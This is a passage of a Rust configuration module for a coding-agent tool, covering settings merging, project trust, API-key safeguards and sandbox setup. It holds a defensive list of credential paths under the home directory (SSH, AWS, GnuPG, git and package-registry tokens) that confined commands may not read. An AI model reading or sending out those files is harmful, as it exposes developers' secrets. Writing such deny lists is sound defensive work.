//! Settings, and the 4 places they can come from.
//!
//! The precedence is fixed.
//! A flag beats the environment.
//! The environment beats the project.
//! The project beats the user.
//! The user beats the built-in default.
//! The narrower statement wins.

use std::collections::{BTreeMap, HashSet};
use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use serde::Deserialize;

/// The file the user keeps for themselves.
pub fn user_config_path() -> Option<PathBuf> {
    let base = match std::env::var_os("XDG_CONFIG_HOME") {
        Some(v) if PathBuf::from(&v).is_absolute() => PathBuf::from(v),
        _ => PathBuf::from(std::env::var_os("HOME")?).join(".config"),
    };
    Some(base.join("lokode").join("config.toml"))
}

/// The file a project keeps for everyone who works on it.
pub fn project_config_path(root: &Path) -> PathBuf {
    root.join(".lokode.toml")
}

/// The project's standing instructions to the agent: its conventions, its build, what it must not
/// touch.
/// They are committed, so the whole team works with the same ones.
pub fn project_instructions_path(root: &Path) -> PathBuf {
    root.join(".lokode.md")
}

/// The user's own standing instructions, for every project.
pub fn user_instructions_path() -> Option<PathBuf> {
    user_config_path().map(|p| p.with_file_name("lokode.md"))
}

/// The standing instructions, user's first and project's second, and anything the user should be
/// told about reading them.
///
/// They are appended to the system message, which compaction never drops.
/// They hold the window for the whole session and are bounded.
/// Trimming is said out loud, so text the agent did not receive does not look like text it ignored.
pub fn load_instructions(root: &Path, max_chars: usize) -> (Option<String>, Vec<String>) {
    let files = [
        user_instructions_path(),
        Some(project_instructions_path(root)),
    ];
    instructions_from(files.into_iter().flatten(), max_chars)
}

/// [`load_instructions`] against paths a caller names.
/// A test drives it without moving the process's home directory.
fn instructions_from(
    files: impl IntoIterator<Item = PathBuf>,
    max_chars: usize,
) -> (Option<String>, Vec<String>) {
    let mut parts = Vec::new();
    let mut warnings = Vec::new();
    for path in files {
        match std::fs::read_to_string(&path) {
            Ok(text) if !text.trim().is_empty() => {
                parts.push((path, text.trim().to_string()));
            }
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => warnings.push(format!("reading {}: {e}", path.display())),
        }
    }
    if parts.is_empty() {
        return (None, warnings);
    }
    let mut text = String::new();
    for (path, body) in &parts {
        if !text.is_empty() {
            text.push_str("\n\n");
        }
        text.push_str(&format!("# {}\n{}", path.display(), body));
    }
    if text.len() > max_chars {
        // Cut at a line boundary: half a sentence of instruction is worse than none.
        let cut = text[..max_chars].rfind('\n').unwrap_or(max_chars);
        warnings.push(format!(
            "standing instructions are longer than this window allows; {} of {} characters were sent",
            cut,
            text.len()
        ));
        text.truncate(cut);
    }
    (Some(text), warnings)
}

/// The directory a project keeps its own commands in, one Markdown file per command.
pub fn commands_dir(root: &Path) -> PathBuf {
    root.join(".lokode").join("commands")
}

/// A first draft of a project's instructions, from what the repository shows.
///
/// It is written from the layout and the test command the repository already states.
pub fn draft_instructions(root: &Path) -> String {
    let has = |name: &str| root.join(name).exists();
    let (language, test) = if has("Cargo.toml") {
        ("Rust", "cargo test")
    } else if has("package.json") {
        ("JavaScript or TypeScript", "npm test")
    } else if has("pyproject.toml") || has("setup.py") {
        ("Python", "pytest")
    } else if has("go.mod") {
        ("Go", "go test ./...")
    } else {
        ("", "")
    };
    let mut dirs: Vec<String> = std::fs::read_dir(root)
        .map(|it| {
            it.filter_map(|e| e.ok())
                .filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false))
                .map(|e| e.file_name().to_string_lossy().to_string())
                .filter(|n| !n.starts_with('.') && n != "target" && n != "node_modules")
                .collect()
        })
        .unwrap_or_default();
    dirs.sort();
    let mut out = String::from(
        "# Working on this project\n\n\
         Everything here is read by the agent at the start of every session. Keep it short:\n\
         it holds the context window for the whole session.\n\n",
    );
    if !language.is_empty() {
        out.push_str(&format!("## What it is\n\n{language}.\n\n"));
        out.push_str(&format!("## Checking a change\n\n`{test}`\n\n"));
    }
    if !dirs.is_empty() {
        out.push_str(&format!("## Layout\n\n{}\n\n", dirs.join(", ")));
    }
    out.push_str(
        "## Conventions\n\n\
         Say what the project expects: how commits are worded, what must not be touched,\n\
         which commands are safe to run without asking.\n",
    );
    out
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct FileConfig {
    pub model: Option<String>,
    /// `plan` to start read-only, `act` to start able to change things.
    pub mode: Option<String>,
    /// `auto`, `native` or `envelope`.
    pub tool_protocol: Option<String>,
    #[serde(default)]
    pub backend: BackendSection,
    /// Other backends, by name, for the agents that name one.
    #[serde(default)]
    pub backends: BTreeMap<String, BackendSection>,
    #[serde(default)]
    pub limits: LimitsSection,
    #[serde(default)]
    pub web: WebSection,
    #[serde(default)]
    pub session: SessionSection,
    /// Tool servers to start, by name. The name prefixes their tools.
    #[serde(default)]
    pub mcp: McpSection,
    #[serde(default)]
    pub shell: ShellSection,
    /// What a particular model needs, by name.
    /// Only the window differs in practice.
    /// A budget inherited from another model either wastes the window or overruns it.
    #[serde(default)]
    pub models: BTreeMap<String, ModelSection>,
    /// What may go ahead without a question, and what may never go ahead at all.
    #[serde(default)]
    pub approve: crate::sandbox::policy::Policy,
    /// Commands to run at the edges of a tool call and a turn.
    #[serde(default)]
    pub hooks: HooksSection,
    /// The sounds that tell an action has finished.
    #[serde(default)]
    pub sounds: crate::sound::SoundsSection,
    /// Which model does which kind of work.
    #[serde(default)]
    pub roles: crate::agent::roles::Roles,
    /// Whether to have a nearby backend hold the next model ready while other work runs.
    /// It does nothing against a backend that is not nearby.
    pub preload: Option<bool>,
    /// Guess the next read while the model is still thinking.
    /// It suits a backend near enough that the request never leaves the network.
    /// A hosted backend would bill for a guess the same as for an answer.
    pub speculate: Option<bool>,
    /// Whether to look into the project while nobody is waiting, and remember what is found.
    pub discover: Option<bool>,
    /// The language servers, by language.
    #[serde(default)]
    pub lsp: LspSection,
    /// Which installed plugins are turned off.
    #[serde(default)]
    pub plugins: PluginsSection,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct PluginsSection {
    /// The plugins installed and turned off, by name.
    #[serde(default)]
    pub disabled: Vec<String>,
    /// The values a plugin asks for, by plugin and then by option.
    #[serde(default)]
    pub options: BTreeMap<String, BTreeMap<String, String>>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct LspSection {
    /// False turns every language server off.
    pub enabled: Option<bool>,
    #[serde(default)]
    pub servers: BTreeMap<String, LspServer>,
}

/// One language server.
/// For a built-in language, what is given replaces the built-in setting.
/// A new language needs a command and its extensions.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct LspServer {
    pub command: Option<String>,
    pub args: Option<Vec<String>>,
    pub extensions: Option<Vec<String>>,
    /// Sent to the server as its initialization options.
    pub init: Option<serde_json::Value>,
    /// What the server is answered when it asks for its settings.
    pub settings: Option<serde_json::Value>,
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    /// False keeps the server from being started.
    pub enabled: Option<bool>,
}

impl LspServer {
    /// `self` with what `over` states put over it.
    fn under(self, over: LspServer) -> LspServer {
        let mut env = self.env;
        env.extend(over.env);
        LspServer {
            command: over.command.or(self.command),
            args: over.args.or(self.args),
            extensions: over.extensions.or(self.extensions),
            init: over.init.or(self.init),
            settings: over.settings.or(self.settings),
            env,
            enabled: over.enabled.or(self.enabled),
        }
    }
}

/// The hooks of each event, each written as a command or as a table, alone or in a list.
/// See `agent::hooks` for what each event does.
#[derive(Debug, Clone, Default, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct HooksSection {
    #[serde(default, deserialize_with = "one_or_many")]
    pub session_start: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub prompt: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub pre_tool: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub post_tool: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub turn_end: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub agent_end: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub compact: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub session_end: Vec<Hook>,
    #[serde(default, deserialize_with = "one_or_many")]
    pub notification: Vec<Hook>,
}

impl HooksSection {
    /// Both sides' hooks, those of `base` first.
    pub fn after(mut self, over: HooksSection) -> HooksSection {
        self.session_start.extend(over.session_start);
        self.prompt.extend(over.prompt);
        self.pre_tool.extend(over.pre_tool);
        self.post_tool.extend(over.post_tool);
        self.turn_end.extend(over.turn_end);
        self.agent_end.extend(over.agent_end);
        self.compact.extend(over.compact);
        self.session_end.extend(over.session_end);
        self.notification.extend(over.notification);
        self
    }
}

/// One hook.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(from = "HookForm")]
pub struct Hook {
    pub command: String,
    /// The tools it runs for, as patterns joined by `|`.
    /// Without it, the tools that change something.
    pub matches: Option<String>,
    /// Seconds it may take.
    pub timeout: Option<u64>,
}

#[derive(Deserialize)]
#[serde(untagged)]
enum HookForm {
    Line(String),
    Table(HookTable),
}

#[derive(Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
struct HookTable {
    command: String,
    #[serde(rename = "match")]
    matches: Option<String>,
    timeout: Option<u64>,
}

impl From<HookForm> for Hook {
    fn from(form: HookForm) -> Self {
        match form {
            HookForm::Line(command) => Hook {
                command,
                matches: None,
                timeout: None,
            },
            HookForm::Table(t) => Hook {
                command: t.command,
                matches: t.matches,
                timeout: t.timeout,
            },
        }
    }
}

/// A hook alone or a list of them.
fn one_or_many<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Vec<Hook>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum OneOrMany {
        One(Hook),
        Many(Vec<Hook>),
    }
    Ok(match OneOrMany::deserialize(d)? {
        OneOrMany::One(h) => vec![h],
        OneOrMany::Many(hs) => hs,
    })
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ModelSection {
    pub context_tokens: Option<usize>,
    pub max_answer_tokens: Option<usize>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ShellSection {
    /// How far the commands the agent runs are confined.
    pub sandbox: Option<crate::sandbox::confine::Level>,
    /// The earlier form of `sandbox`: true is `workspace`, false is `off`.
    pub confine_writes: Option<bool>,
    /// Directories a confined command may still write to, on top of those of its level.
    ///
    /// A `~` is expanded against the home directory and a relative name against the project.
    /// See `resolve_sandbox`, which is where that has to happen.
    #[serde(default)]
    pub writable: Vec<PathBuf>,
    /// Files and directories a confined command may not read, on top of the credentials
    /// it never reads. Written like `writable`.
    #[serde(default)]
    pub hidden: Vec<PathBuf>,
    /// How a confined command reaches the network: `closed`, `proxy` or `open`.
    ///
    /// When not given, `proxy` in the workspace where the system allows it, `closed` in
    /// read-only.
    /// The earlier form is a boolean: true is `open`, false is `closed`.
    pub network: Option<NetworkSetting>,
}

/// What `[shell] network` says: a mode, or the earlier boolean.
#[derive(Debug, Clone, Copy, Deserialize, PartialEq, Eq)]
#[serde(untagged)]
pub enum NetworkSetting {
    Mode(crate::sandbox::confine::Network),
    Flag(bool),
}

impl ShellSection {
    /// The level the file asks for, if it asks.
    pub fn level(&self) -> Option<crate::sandbox::confine::Level> {
        use crate::sandbox::confine::Level;
        self.sandbox.or(match self.confine_writes {
            Some(true) => Some(Level::Workspace),
            Some(false) => Some(Level::Off),
            None => None,
        })
    }
}

/// The credentials below the home directory that a confined command may not read.
const SECRETS: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".azure",
    ".kube",
    ".docker/config.json",
    ".netrc",
    ".git-credentials",
    ".npmrc",
    ".pypirc",
    ".vault-token",
    ".password-store",
    ".cargo/credentials",
    ".cargo/credentials.toml",
    ".config/gh",
    ".config/gcloud",
    ".local/share/keyrings",
    ".terraform.d/credentials.tfrc.json",
];

/// The build caches below the home directory that a command confined to the workspace may write
/// to, when they are there.
const CACHES: &[&str] = &[
    ".cache",
    ".cargo/registry",
    ".cargo/git",
    ".cargo/.package-cache",
    ".cargo/.package-cache-mutate",
    ".cargo/.global-cache",
    ".npm",
    ".pnpm-store",
    "go/pkg/mod",
    ".m2/repository",
    ".gradle/caches",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Deserialize, clap::ValueEnum)]
#[serde(rename_all = "kebab-case")]
pub enum BackendKind {
    #[default]
    Auto,
    /// The format almost every server speaks: LLMuse, ollama, vLLM, llama.cpp, OpenAI.
    Openai,
    /// The Anthropic Messages API.
    Anthropic,
}

impl BackendKind {
    /// Settle `auto` against the URL it will be talking to.
    pub fn resolve(self, url: &str) -> Self {
        match self {
            BackendKind::Auto if url.contains("api.anthropic.com") => BackendKind::Anthropic,
            BackendKind::Auto => BackendKind::Openai,
            explicit => explicit,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            BackendKind::Auto => "auto",
            BackendKind::Openai => "openai",
            BackendKind::Anthropic => "anthropic",
        }
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct McpSection {
    #[serde(default)]
    pub servers: BTreeMap<String, McpServer>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct McpServer {
    /// The program to start, for a server spoken to over its input and output.
    pub command: Option<String>,
    #[serde(default)]
    pub args: Vec<String>,
    /// Where to reach a server spoken to over HTTP, in place of a command.
    pub url: Option<String>,
    /// Headers sent to a server over HTTP.
    #[serde(default)]
    pub headers: BTreeMap<String, String>,
    /// The variable that holds a token sent as `Authorization: Bearer` to a server over HTTP.
    pub token_env: Option<String>,
    /// The client to sign in as with `/mcp login`, for an authorization server that does not
    /// register clients.
    pub client_id: Option<String>,
    /// What to ask for when signing in, when the server does not say.
    #[serde(default)]
    pub scopes: Vec<String>,
    #[serde(default)]
    pub env: std::collections::HashMap<String, String>,
    /// Set false to keep a server configured but not started.
    #[serde(default = "yes")]
    pub enabled: bool,
    /// Seconds to wait for one of its answers, the handshake included.
    pub timeout: Option<u64>,
}

fn yes() -> bool {
    true
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct BackendSection {
    /// A provider lokode knows by name.
    /// It gives the url, the kind and the variable of the key when they are not written.
    pub provider: Option<String>,
    /// Which API the backend speaks.
    /// `auto` reads it off the URL.
    /// api.anthropic.com is Anthropic, and everything else is OpenAI-compatible.
    /// Name one explicitly to reach an Anthropic-compatible proxy on your own host.
    pub kind: Option<BackendKind>,
    pub url: Option<String>,
    /// A key written in the file itself.
    /// Refused when the file is readable by anyone else, as ssh refuses a private key with loose
    /// permissions.
    /// A secret in a world-readable file is not a secret.
    pub api_key: Option<String>,
    /// The name of an environment variable to take the key from instead.
    /// Preferred, since it keeps the secret out of a file that tends to end up in version control.
    pub api_key_env: Option<String>,
    /// Extra headers, sent with every request.
    #[serde(default)]
    pub headers: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct LimitsSection {
    pub max_steps: Option<usize>,
    pub context_tokens: Option<usize>,
    pub max_answer_tokens: Option<usize>,
    /// How many delegated turns run at once.
    pub delegates: Option<usize>,
    /// How many levels of agents may hand work on, the first included.
    pub depth: Option<usize>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct WebSection {
    /// Hosts `web_fetch` may reach despite resolving to a private address.
    #[serde(default)]
    pub allow_hosts: Vec<String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct SessionSection {
    pub transcripts: Option<bool>,
    pub log_file: Option<PathBuf>,
}

/// Read one file, if it is there.
pub fn read(path: &Path) -> Result<Option<FileConfig>> {
    read_text(path)?.map(|text| parse(&text, path)).transpose()
}

fn read_text(path: &Path) -> Result<Option<String>> {
    match std::fs::read_to_string(path) {
        Ok(t) => Ok(Some(t)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e).with_context(|| format!("reading {}", path.display())),
    }
}

/// The text of the file at `path`, read as a configuration.
fn parse(text: &str, path: &Path) -> Result<FileConfig> {
    let cfg: FileConfig =
        toml::from_str(text).with_context(|| format!("parsing {}", path.display()))?;

    let has_key =
        cfg.backend.api_key.is_some() || cfg.backends.values().any(|b| b.api_key.is_some());
    if has_key && is_readable_by_others(path) {
        anyhow::bail!(
            "{} contains an api-key and is readable by others; \
             run `chmod 600 {}`, or use api-key-env to name a variable instead",
            path.display(),
            path.display()
        );
    }
    Ok(cfg)
}

#[cfg(unix)]
fn is_readable_by_others(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|m| m.permissions().mode() & 0o077 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_readable_by_others(_path: &Path) -> bool {
    false
}

/// Later files override earlier ones, field by field.
pub fn merge(base: FileConfig, over: FileConfig) -> FileConfig {
    // A later file that names a provider names a different backend.
    // Nothing of the earlier one carries over to it, its key least of all.
    let backend = match over.backend.provider.is_some() {
        true => over.backend.clone(),
        false => BackendSection {
            provider: base.backend.provider.clone(),
            kind: over.backend.kind.or(base.backend.kind),
            url: over.backend.url.clone().or(base.backend.url.clone()),
            api_key: over
                .backend
                .api_key
                .clone()
                .or(base.backend.api_key.clone()),
            api_key_env: over
                .backend
                .api_key_env
                .clone()
                .or(base.backend.api_key_env.clone()),
            headers: {
                let mut h = base.backend.headers.clone();
                h.extend(over.backend.headers.clone());
                h
            },
        },
    };
    FileConfig {
        model: over.model.or(base.model),
        mode: over.mode.or(base.mode),
        tool_protocol: over.tool_protocol.or(base.tool_protocol),
        backend,
        backends: {
            let mut b = base.backends;
            b.extend(over.backends);
            b
        },
        limits: LimitsSection {
            max_steps: over.limits.max_steps.or(base.limits.max_steps),
            context_tokens: over.limits.context_tokens.or(base.limits.context_tokens),
            max_answer_tokens: over
                .limits
                .max_answer_tokens
                .or(base.limits.max_answer_tokens),
            delegates: over.limits.delegates.or(base.limits.delegates),
            depth: over.limits.depth.or(base.limits.depth),
        },
        web: WebSection {
            allow_hosts: {
                // Added to rather than replaced.
                // A project naming its own dev server keeps the ones the user allowed everywhere.
                let mut hosts = base.web.allow_hosts;
                hosts.extend(over.web.allow_hosts);
                hosts
            },
        },
        session: SessionSection {
            transcripts: over.session.transcripts.or(base.session.transcripts),
            log_file: over.session.log_file.or(base.session.log_file),
        },
        shell: ShellSection {
            sandbox: over.shell.sandbox.or(base.shell.sandbox),
            confine_writes: over.shell.confine_writes.or(base.shell.confine_writes),
            writable: {
                let mut w = base.shell.writable;
                w.extend(over.shell.writable);
                w
            },
            hidden: {
                let mut h = base.shell.hidden;
                h.extend(over.shell.hidden);
                h
            },
            network: over.shell.network.or(base.shell.network),
        },
        roles: crate::agent::roles::Roles::merge(base.roles, over.roles),
        preload: over.preload.or(base.preload),
        speculate: over.speculate.or(base.speculate),
        discover: over.discover.or(base.discover),
        lsp: LspSection {
            enabled: over.lsp.enabled.or(base.lsp.enabled),
            servers: {
                // Merged by language and field.
                // A project can change one setting of a server the user configured.
                let mut servers = base.lsp.servers;
                for (name, server) in over.lsp.servers {
                    let merged = match servers.remove(&name) {
                        Some(base) => base.under(server),
                        None => server,
                    };
                    servers.insert(name, merged);
                }
                servers
            },
        },
        hooks: base.hooks.after(over.hooks),
        sounds: base.sounds.under(over.sounds),
        plugins: PluginsSection {
            disabled: {
                let mut d = base.plugins.disabled;
                d.extend(over.plugins.disabled);
                d
            },
            options: {
                let mut o = base.plugins.options;
                o.extend(over.plugins.options);
                o
            },
        },
        approve: crate::sandbox::policy::Policy {
            // Added to rather than replaced, on both sides.
            // A project stating what is safe in it does not drop the user's own refusals.
            // A user's refusal survives a project that says nothing about it.
            allow: merge_rules(base.approve.allow, over.approve.allow),
            deny: merge_rules(base.approve.deny, over.approve.deny),
            ask: merge_rules(base.approve.ask, over.approve.ask),
            max_auto: over.approve.max_auto.min(base.approve.max_auto),
        },
        models: {
            let mut models = base.models;
            models.extend(over.models);
            models
        },
        mcp: McpSection {
            servers: {
                // Merged by name.
                // A project can add a server without restating the user's.
                // A project can replace one of theirs by using the same name.
                let mut servers = base.mcp.servers;
                servers.extend(over.mcp.servers);
                servers
            },
        },
    }
}

/// A project file whose guarded settings were left out, not being trusted.
#[derive(Debug, Clone, PartialEq)]
pub struct Untrusted {
    pub path: PathBuf,
    /// The settings left out, as TOML.
    pub guarded: String,
}

impl Untrusted {
    /// What the session says about the settings it left out.
    pub fn warning(&self) -> String {
        let tables: Vec<_> = crate::trust::GUARDED
            .iter()
            .copied()
            .chain(["approve.allow"])
            .filter(|t| self.guarded.contains(&format!("[{t}")))
            .collect();
        format!(
            "{} is not trusted, so its {} settings are left out. Start lokode here and \
             trust it, or pass --trust-project",
            self.path.display(),
            tables.join(", ")
        )
    }
}

/// The configuration, with the project settings left out of it when they are not trusted.
#[derive(Debug, Clone)]
pub struct Loaded {
    pub file: FileConfig,
    pub untrusted: Option<Untrusted>,
}

/// The user's file, then the project's.
/// The project's guarded settings are taken when the user trusted them or `trust` says to.
/// They are left out otherwise.
pub fn load(root: &Path, trust: bool) -> Result<Loaded> {
    let mut cfg = FileConfig::default();
    if let Some(path) = user_config_path() {
        if let Some(user) = read(&path)? {
            cfg = merge(cfg, user);
        }
    }
    // The plugins come after the user's file and before the project's.
    // They are the user's, and the project still has the last word on its own settings.
    let (plugins, _) = crate::plugins::load();
    let added = crate::plugins::sections(&plugins);
    cfg.hooks = cfg.hooks.after(added.hooks);
    for (name, server) in added.servers {
        cfg.mcp.servers.entry(name).or_insert(server);
    }
    for (name, server) in added.lsp {
        cfg.lsp.servers.entry(name).or_insert(server);
    }
    let path = project_config_path(root);
    let mut untrusted = None;
    if let Some(text) = read_text(&path)? {
        let split =
            crate::trust::split(&text).with_context(|| format!("parsing {}", path.display()))?;
        let project = match split.guarded {
            Some(guarded) if !trust && !crate::trust::is_trusted(root, &guarded) => {
                let open = toml::Value::Table(split.open)
                    .try_into()
                    .with_context(|| format!("parsing {}", path.display()))?;
                untrusted = Some(Untrusted {
                    path: path.clone(),
                    guarded,
                });
                open
            }
            _ => parse(&text, &path)?,
        };
        cfg = merge(cfg, project);
    }
    Ok(Loaded {
        file: cfg,
        untrusted,
    })
}

/// Both sides of a rule set, kept.
fn merge_rules(
    mut base: crate::sandbox::policy::Rules,
    over: crate::sandbox::policy::Rules,
) -> crate::sandbox::policy::Rules {
    base.bash.extend(over.bash);
    base.write.extend(over.write);
    base.egress.extend(over.egress);
    base.tools.extend(over.tools);
    base
}

/// Write the model into the user's configuration, so the next session starts on it.
///
/// The rest of the file is left as it is, comments included.
/// Only a top-level `model =` line is touched.
/// One is added at the top when there is none.
pub fn remember_model(path: &Path, name: &str) -> Result<()> {
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).with_context(|| format!("creating {}", dir.display()))?;
    }
    let existing = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => return Err(e).with_context(|| format!("reading {}", path.display())),
    };
    std::fs::write(path, with_model(&existing, name))
        .with_context(|| format!("writing {}", path.display()))
}

/// `text` with its top-level `model` set to `name`.
fn with_model(text: &str, name: &str) -> String {
    let line = format!("model = \"{name}\"");
    let mut out: Vec<String> = Vec::new();
    let mut written = false;
    for raw in text.lines() {
        let trimmed = raw.trim_start();
        // Past the first table header a `model =` belongs to that table, not to the top level.
        if !written && trimmed.starts_with('[') {
            out.push(line.clone());
            written = true;
        }
        if !written && trimmed.starts_with("model") && trimmed[5..].trim_start().starts_with('=') {
            out.push(line.clone());
            written = true;
            continue;
        }
        out.push(raw.to_string());
    }
    if !written {
        out.insert(0, line);
    }
    let mut text = out.join("\n");
    if !text.ends_with('\n') {
        text.push('\n');
    }
    text
}

/// One header, as it will be sent.
pub type Header = (String, String);

/// What to send, and what the user should be told about sending it.
pub struct Headers {
    pub headers: Vec<Header>,
    pub warnings: Vec<String>,
}

/// Headers to send with every backend request, and anything worth warning about.
///
/// The key is looked for in the environment first.
/// That lets a shared project file name a variable without holding its value.
pub fn resolve_headers(
    cfg: &FileConfig,
    cli_headers: &[String],
    backend_url: &str,
) -> Result<Headers> {
    let mut headers: Vec<Header> = Vec::new();
    let mut warnings = Vec::new();

    for (k, v) in &cfg.backend.headers {
        headers.push((k.clone(), v.clone()));
    }
    for raw in cli_headers {
        let (k, v) = raw
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("--header expects name=value, got {raw:?}"))?;
        headers.push((k.trim().to_string(), v.trim().to_string()));
    }

    let key = std::env::var("LOKODE_API_KEY")
        .ok()
        .filter(|k| !k.trim().is_empty())
        .or_else(|| {
            cfg.backend
                .api_key_env
                .as_ref()
                .and_then(|name| std::env::var(name).ok())
                .filter(|k| !k.trim().is_empty())
        })
        .or_else(|| cfg.backend.api_key.clone());

    if let Some(key) = key {
        // The credential would otherwise be sent in the clear to a machine that is not this one.
        if sends_secret_in_clear(backend_url) {
            warnings.push(format!(
                "sending an API key over plain http to {backend_url}; anyone on the path can read it"
            ));
        }
        headers.push(("Authorization".into(), format!("Bearer {key}")));
    }
    Ok(Headers { headers, warnings })
}

/// A backend of `[backends]`, settled: where it is, what it speaks, what to send it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NamedBackend {
    pub url: String,
    pub kind: BackendKind,
    pub headers: Vec<Header>,
}

/// `b` with what its provider gives filled in where nothing is written.
pub fn with_preset(b: &BackendSection) -> Result<BackendSection, String> {
    let mut b = b.clone();
    if let Some(name) = &b.provider {
        let preset = crate::backend::presets::named(name)?;
        b.url.get_or_insert_with(|| preset.url.to_string());
        b.kind.get_or_insert(preset.kind);
        if b.api_key_env.is_none() && b.api_key.is_none() {
            b.api_key_env = preset.key_env.map(str::to_string);
        }
    }
    Ok(b)
}

/// The backends of `[backends]`, settled.
///
/// A key comes from the variable `api-key-env` names, or from `api-key` in a file only the user can
/// read.
/// What could not be settled comes back as a warning.
pub fn resolve_backends(cfg: &FileConfig) -> (BTreeMap<String, NamedBackend>, Vec<String>) {
    let mut out = BTreeMap::new();
    let mut warnings = Vec::new();
    for (name, b) in &cfg.backends {
        let b = match with_preset(b) {
            Ok(b) => b,
            Err(why) => {
                warnings.push(format!("the backend {name}: {why}"));
                continue;
            }
        };
        let Some(url) = b.url.clone() else {
            warnings.push(format!("the backend {name} has no url"));
            continue;
        };
        let mut headers: Vec<Header> = b.headers.clone().into_iter().collect();
        let key = b
            .api_key_env
            .as_ref()
            .and_then(|v| std::env::var(v).ok())
            .filter(|k| !k.trim().is_empty())
            .or_else(|| b.api_key.clone());
        if let Some(key) = key {
            if sends_secret_in_clear(&url) {
                warnings.push(format!(
                    "sending an API key over plain http to {url}; anyone on the path can read it"
                ));
            }
            headers.push(("Authorization".into(), format!("Bearer {key}")));
        }
        let kind = b.kind.unwrap_or_default().resolve(&url);
        out.insert(name.clone(), NamedBackend { url, kind, headers });
    }
    (out, warnings)
}

/// Whether the backend's weights are near enough that loading them is worth arranging.
///
/// A hosted endpoint has nothing to warm and would be charged for the attempt, so it is left alone.
/// Nearness is read off the address, not declared.
pub fn backend_is_nearby(url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url) else {
        return false;
    };
    match parsed.host_str() {
        Some("localhost") | None => true,
        Some(host) => match host.parse::<std::net::IpAddr>() {
            Ok(ip) => ip.is_loopback() || is_private(ip),
            Err(_) => false,
        },
    }
}

fn is_private(ip: std::net::IpAddr) -> bool {
    match ip {
        std::net::IpAddr::V4(v4) => v4.is_private() || v4.is_link_local(),
        // The unique-local range, which is where a home network's addresses sit.
        std::net::IpAddr::V6(v6) => (v6.segments()[0] & 0xfe00) == 0xfc00,
    }
}

/// Whether a credential sent to this URL would cross a network unencrypted.
fn sends_secret_in_clear(url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url) else {
        return false;
    };
    if parsed.scheme() != "http" {
        return false;
    }
    match parsed.host_str() {
        Some("localhost") | None => false,
        Some(host) => match host.parse::<std::net::IpAddr>() {
            Ok(ip) => !ip.is_loopback(),
            // A name that is not an address might be anywhere.
            Err(_) => true,
        },
    }
}

/// The directories a confined shell command may write to.
///
/// The project first, then whatever `[shell] writable` named.
/// The named ones are expanded here, not handed to the kernel as written.
/// A rule is attached to an open directory, so `~/.cargo` opens nothing and becomes no rule.
///
/// What cannot be resolved is reported, not dropped.
pub fn resolve_sandbox(
    cfg: &FileConfig,
    root: &Path,
    level: crate::sandbox::confine::Level,
    warnings: &mut Vec<String>,
) -> crate::sandbox::confine::Sandbox {
    use crate::sandbox::confine::{Level, Sandbox};
    let mut unset = vec!["LOKODE_API_KEY".to_string()];
    unset.extend(cfg.backend.api_key_env.clone());
    unset.extend(cfg.backends.values().filter_map(|b| b.api_key_env.clone()));
    let writable = match level {
        Level::Workspace => resolve_shell_writable(cfg, root, warnings),
        Level::ReadOnly | Level::Off => Vec::new(),
    };
    let home = std::env::var_os("HOME").map(PathBuf::from);
    let mut hidden: Vec<PathBuf> = home
        .iter()
        .flat_map(|h| SECRETS.iter().map(move |s| h.join(s)))
        .chain(user_config_path().and_then(|p| p.parent().map(Path::to_path_buf)))
        .chain(crate::paths::data_dir())
        .filter(|p| p.exists())
